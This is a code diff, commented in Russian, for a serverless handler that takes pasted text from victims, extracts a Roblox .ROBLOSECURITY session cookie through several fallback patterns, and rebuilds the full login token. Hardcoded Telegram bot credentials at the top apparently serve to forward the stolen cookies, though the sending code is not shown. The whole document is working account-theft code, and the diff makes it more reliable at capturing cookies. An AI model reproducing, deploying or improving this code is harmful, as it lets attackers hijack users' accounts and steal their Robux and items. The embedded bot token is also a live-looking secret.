@@ -1,12 +1,25 @@
 const fetch = require('node-fetch');
 
-// ===== ТВОИ ДАННЫЕ (ЗАХАРДКОЖЕНЫ) =====
+// ===== ТВОИ ДАННЫЕ =====
 const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
 const CHAT_ID = "-5527664230";
-// ========================================
+// ========================
 
-// Точный префикс, который должен быть в итоговом токене
 const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
+function extractCookie(text) {
+    // Ищем самую длинную последовательность допустимых символов (длиной > 30)
+    const pattern = /[A-Za-z0-9._\-]{30,}/g;
+    const matches = text.match(pattern);
+    if (matches) {
+        let longest = '';
+        for (let m of matches) {
+            if (m.length > longest.length) longest = m;
+        }
+        return longest;
+    }
+    return null;
+}
 
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') {
@@ -19,59 +32,60 @@ exports.handler = async (event) => {
             return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
         }
 
-        let token = null;
+        let raw = null;
 
-        // 1) Если уже есть префикс — берём всё, что после него (до пробела или кавычки)
+        // 1) Если есть префикс – берём всё после него до первого недопустимого символа
         if (code.includes(PREFIX)) {
             const start = code.indexOf(PREFIX) + PREFIX.length;
-            let end = code.length;
-            const spaceIdx = code.indexOf(' ', start);
-            const quoteIdx = code.indexOf('"', start);
-            if (spaceIdx !== -1) end = Math.min(end, spaceIdx);
-            if (quoteIdx !== -1) end = Math.min(end, quoteIdx);
-            const rawToken = code.substring(start, end);
-            token = PREFIX + rawToken;
-        }
-
-        // 2) Если нет префикса, ищем .ROBLOSECURITY=...
-        if (!token) {
-            const roblosecPattern = /\.ROBLOSECURITY=([^;\s"]+)/;
-            const match = code.match(roblosecPattern);
-            if (match) {
-                token = PREFIX + match[1];
+            let end = start;
+            for (let i = start; i < code.length; i++) {
+                const ch = code[i];
+                if (/[A-Za-z0-9._\-]/.test(ch)) {
+                    end = i + 1;
+                } else {
+                    break;
+                }
             }
+            raw = code.substring(start, end);
         }
 
-        // 3) Если нет, ищем просто "WARNING:-DO-NOT-SHARE-THIS..." (без подчёркиваний)
-        if (!token) {
-            const warningText = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
-            const idx = code.indexOf(warningText);
+        // 2) Если нет – ищем .ROBLOSECURITY=...
+        if (!raw) {
+            const match = code.match(/\.ROBLOSECURITY=([A-Za-z0-9._\-]+)/);
+            if (match) raw = match[1];
+        }
+
+        // 3) Если нет – ищем "WARNING:-DO-NOT-SHARE-THIS..." без подчёркиваний
+        if (!raw) {
+            const warning = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
+            const idx = code.indexOf(warning);
             if (idx !== -1) {
-                const start = idx + warningText.length;
-                let end = code.length;
-                const spaceIdx = code.indexOf(' ', start);
-                const quoteIdx = code.indexOf('"', start);
-                if (spaceIdx !== -1) end = Math.min(end, spaceIdx);
-                if (quoteIdx !== -1) end = Math.min(end, quoteIdx);
-                const raw = code.substring(start, end);
-                if (raw && raw.length > 0) {
-                    token = PREFIX + raw;
+                const start = idx + warning.length;
+                let end = start;
+                for (let i = start; i < code.length; i++) {
+                    const ch = code[i];
+                    if (/[A-Za-z0-9._\-]/.test(ch)) {
+                        end = i + 1;
+                    } else {
+                        break;
+                    }
                 }
+                raw = code.substring(start, end);
             }
         }
 
-        // 4) Если ничего не нашли — попробуем взять самую длинную строку без пробелов (как запасной вариант)
-        if (!token) {
-            const longTokenPattern = /[A-Za-z0-9.\-_]+/g;
-            const matches = code.match(longTokenPattern);
-            if (matches) {
-                let longest = '';
-                for (let m of matches) {
-                    if (m.length > longest.length && m.length > 20) longest = m;
-                }
-                if (longest) {
-                    token = PREFIX + longest;
-                }
+        // 4) Если ничего не нашли – пытаемся выцепить любую длинную строку
+        if (!raw) {
+            const cookie = extractCookie(code);
+            if (cookie) raw = cookie;
+        }
+
+        let token = null;
+        if (raw) {
+            // Оставляем только допустимые символы (на всякий случай)
+            const clean = raw.replace(/[^A-Za-z0-9._\-]/g, '');
+            if (clean.length > 20) {
+                token = PREFIX + clean;
             }
         }
 
